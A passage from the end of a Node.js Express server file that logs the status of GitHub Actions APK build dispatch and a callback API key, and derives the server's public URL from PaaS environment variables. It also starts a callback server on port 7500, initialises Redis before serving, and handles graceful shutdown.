        log('BUILD', `GitHub Actions build dispatch: ready (GITHUB_PERSONAL_ACCESS_TOKEN configured).`);
    } else {
        log('BUILD', 'GitHub Actions build dispatch: NOT ready — set GITHUB_PERSONAL_ACCESS_TOKEN env var to enable APK builds.', 'warn');
    }
    if (buildWorkerSettings.apiKey) {
        const src = process.env._BUILD_KEY_SOURCE || 'unknown';
        const srcLabel = src === 'generated' ? 'auto-generated + saved to file'
                       : src === 'file'      ? 'loaded from persistent file'
                       : src === 'env'       ? 'from env var'
                       : src;
        log('BUILD', `Callback API key: configured (length=${buildWorkerSettings.apiKey.length}, source: ${srcLabel}).`);
        if (src === 'generated') {
            log('BUILD', '[BUILD-KEY] New key generated — will be pushed to GitHub Actions automatically.');
        }
    } else {
        log('BUILD', 'Callback API key: NOT configured.', 'warn');
    }
}

// ── AUTO-SYNC GITHUB ACTIONS SECRETS ON STARTUP ────────────────────────────
// Detects the server's own public URL (works on Replit, Heroku, Render,
// Railway, Fly.io, Zeabur, or any PaaS) and pushes the current
// CALLBACK_URL + BUILD_API_KEY into the GitHub Actions repo secrets so
// callbacks always reach this instance — no manual secret editing required.

function _derivePublicUrl() {
    // Priority order: explicit override → Replit dev domain → PaaS-specific →
    // generic PUBLIC_URL → nothing (will skip sync)
    const e = process.env;
    if (e.PUBLIC_URL && e.PUBLIC_URL.trim())                    return e.PUBLIC_URL.trim();
    if (e.REPLIT_DEV_DOMAIN)                                    return `https://${e.REPLIT_DEV_DOMAIN.trim()}`;
    if (e.RAILWAY_PUBLIC_DOMAIN)                                return `https://${e.RAILWAY_PUBLIC_DOMAIN.trim()}`;
    if (e.RAILWAY_STATIC_URL)                                   return e.RAILWAY_STATIC_URL.trim();
    if (e.RENDER_EXTERNAL_URL)                                  return e.RENDER_EXTERNAL_URL.trim();
    if (e.HEROKU_APP_NAME)                                      return `https://${e.HEROKU_APP_NAME.trim()}.herokuapp.com`;
    if (e.FLY_APP_NAME)                                         return `https://${e.FLY_APP_NAME.trim()}.fly.dev`;
    if (e.ZEABUR_DOMAIN)                                        return `https://${e.ZEABUR_DOMAIN.trim()}`;
    if (e.KOYEB_PUBLIC_DOMAIN)                                  return `https://${e.KOYEB_PUBLIC_DOMAIN.trim()}`;
    return null;
}

// CALLBACK_URL and BUILD_API_KEY are no longer stored as GitHub secrets.
// They are injected fresh into every build job via client_payload at dispatch
// time (see POST /api/build/apk), so they always match the running server
// regardless of restarts or platform migrations. No sync needed at startup.
async function _syncGitHubCallbackSecrets() {
    // intentionally empty — kept for call-site compatibility
}

// Secondary server on port 7500 so GitHub Actions callbacks reach Express
// via the Replit externalPort=80 mapping (which routes to localPort=7500).
const CALLBACK_PORT = 7500;
const callbackServer = require('http').createServer(app);
callbackServer.listen(CALLBACK_PORT, '0.0.0.0', () => {
    log('HTTP', `Callback mirror listening on port ${CALLBACK_PORT} (GHA callbacks via externalPort=80)`);
});
callbackServer.on('error', (err) => {
    log('HTTP', `Callback mirror port ${CALLBACK_PORT} error: ${err.message}`, 'warn');
});

// Initialize Redis first, then start HTTP server
R.init().then(() => {
    server.listen(HTTP_PORT, '0.0.0.0', () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
        if (!process.env.REDIS_URL) {
            log('REDIS', 'REDIS_URL not configured — skipping Redis (in-memory only)', 'warn');
        }
        _logBuildWorkerStatus();
        _syncGitHubCallbackSecrets().catch(e => log('BUILD', `[GH-SYNC] Unexpected error: ${e.message}`, 'warn'));
    });
}).catch((err) => {
    log('REDIS', `Init error: ${err.message} — starting without Redis`, 'warn');
    server.listen(HTTP_PORT, '0.0.0.0', () => {
        log('HTTP', `Server running on port ${HTTP_PORT}`);
        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
        log('TCP',  `Android devices → localhost:${TCP_PORT}`);
        _logBuildWorkerStatus();
        _syncGitHubCallbackSecrets().catch(e => log('BUILD', `[GH-SYNC] Unexpected error: ${e.message}`, 'warn'));
    });
});

async function gracefulShutdown(signal) {
    log('SHUTDOWN', `${signal} received — closing…`);
    try { await R.quit(); } catch (_) {}
    try { await mongoose.connection.close(); } catch (_) {}
    process.exit(0);
}

process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

module.exports = { app, server };
